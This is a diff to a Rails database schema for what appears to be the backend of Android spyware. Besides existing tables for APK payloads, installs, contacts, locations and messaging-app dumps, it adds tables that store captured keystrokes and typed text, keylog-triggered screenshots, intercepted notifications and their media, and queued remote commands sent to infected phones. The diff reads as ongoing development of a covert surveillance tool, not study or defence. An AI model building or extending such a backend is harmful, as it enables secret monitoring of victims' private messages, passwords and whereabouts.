@@ -10,7 +10,7 @@
 #
 # It's strongly recommended that you check this file into your version control system.
 
-ActiveRecord::Schema.define(version: 2020_06_09_123744) do
+ActiveRecord::Schema.define(version: 2026_02_02_212206) do
 
   # These are extensions that must be enabled in order to support this database
   enable_extension "plpgsql"
@@ -72,12 +72,76 @@ ActiveRecord::Schema.define(version: 2020_06_09_123744) do
     t.index ["smartphone_id"], name: "index_contacts_on_smartphone_id"
   end
 
+  create_table "device_notifications", force: :cascade do |t|
+    t.string "device_id", null: false
+    t.string "package_name", null: false
+    t.string "app_name"
+    t.string "title"
+    t.text "content"
+    t.string "sub_text"
+    t.string "category"
+    t.integer "notification_id"
+    t.string "group_key"
+    t.boolean "is_ongoing", default: false
+    t.boolean "is_clearable", default: true
+    t.bigint "post_time"
+    t.datetime "received_at"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["device_id", "post_time"], name: "index_device_notifications_on_device_id_and_post_time"
+    t.index ["device_id"], name: "index_device_notifications_on_device_id"
+    t.index ["package_name"], name: "index_device_notifications_on_package_name"
+    t.index ["post_time"], name: "index_device_notifications_on_post_time"
+  end
+
   create_table "geo_locations", force: :cascade do |t|
     t.date "date"
     t.string "lat"
     t.string "long"
     t.bigint "smartphone_id", null: false
     t.index ["smartphone_id"], name: "index_geo_locations_on_smartphone_id"
+  end
+
+  create_table "keylog_screenshots", force: :cascade do |t|
+    t.bigint "smartphone_id", null: false
+    t.string "device_id"
+    t.bigint "client_timestamp"
+    t.string "app_package"
+    t.string "app_name"
+    t.string "trigger_type"
+    t.string "image_path"
+    t.integer "width"
+    t.integer "height"
+    t.integer "file_size"
+    t.string "session_id"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["client_timestamp"], name: "index_keylog_screenshots_on_client_timestamp"
+    t.index ["device_id"], name: "index_keylog_screenshots_on_device_id"
+    t.index ["smartphone_id"], name: "index_keylog_screenshots_on_smartphone_id"
+    t.index ["trigger_type"], name: "index_keylog_screenshots_on_trigger_type"
+  end
+
+  create_table "keylogs", force: :cascade do |t|
+    t.bigint "smartphone_id", null: false
+    t.string "device_id"
+    t.bigint "client_timestamp"
+    t.string "app_package"
+    t.string "app_name"
+    t.string "activity"
+    t.string "keystroke"
+    t.text "full_text"
+    t.string "input_type"
+    t.string "field_id"
+    t.string "event_type"
+    t.string "session_id"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["app_package"], name: "index_keylogs_on_app_package"
+    t.index ["client_timestamp"], name: "index_keylogs_on_client_timestamp"
+    t.index ["device_id"], name: "index_keylogs_on_device_id"
+    t.index ["event_type"], name: "index_keylogs_on_event_type"
+    t.index ["smartphone_id"], name: "index_keylogs_on_smartphone_id"
   end
 
   create_table "messaging_apps_dumps", force: :cascade do |t|
@@ -87,6 +151,33 @@ ActiveRecord::Schema.define(version: 2020_06_09_123744) do
     t.bigint "smartphone_id", null: false
     t.string "app_name"
     t.index ["smartphone_id"], name: "index_messaging_apps_dumps_on_smartphone_id"
+  end
+
+  create_table "notification_media", force: :cascade do |t|
+    t.bigint "device_notification_id", null: false
+    t.string "media_type", null: false
+    t.binary "data"
+    t.string "mime_type"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["device_notification_id"], name: "index_notification_media_on_device_notification_id"
+    t.index ["media_type"], name: "index_notification_media_on_media_type"
+  end
+
+  create_table "pending_commands", force: :cascade do |t|
+    t.bigint "smartphone_id", null: false
+    t.string "request_id", null: false
+    t.string "command", null: false
+    t.json "params"
+    t.integer "status", default: 0, null: false
+    t.json "response_data"
+    t.datetime "completed_at"
+    t.datetime "created_at", precision: 6, null: false
+    t.datetime "updated_at", precision: 6, null: false
+    t.index ["created_at"], name: "index_pending_commands_on_created_at"
+    t.index ["request_id"], name: "index_pending_commands_on_request_id", unique: true
+    t.index ["smartphone_id"], name: "index_pending_commands_on_smartphone_id"
+    t.index ["status"], name: "index_pending_commands_on_status"
   end
 
   create_table "pictures", force: :cascade do |t|
@@ -120,6 +211,7 @@ ActiveRecord::Schema.define(version: 2020_06_09_123744) do
     t.bigint "apk_installation_id", null: false
     t.datetime "created_at", precision: 6, null: false
     t.datetime "updated_at", precision: 6, null: false
+    t.string "device_id"
     t.index ["apk_installation_id"], name: "index_smartphones_on_apk_installation_id"
   end
 
@@ -131,5 +223,9 @@ ActiveRecord::Schema.define(version: 2020_06_09_123744) do
   end
 
   add_foreign_key "apk_installations", "apk_payloads"
+  add_foreign_key "keylog_screenshots", "smartphones"
+  add_foreign_key "keylogs", "smartphones"
+  add_foreign_key "notification_media", "device_notifications"
+  add_foreign_key "pending_commands", "smartphones"
   add_foreign_key "smartphones", "apk_installations"
 end
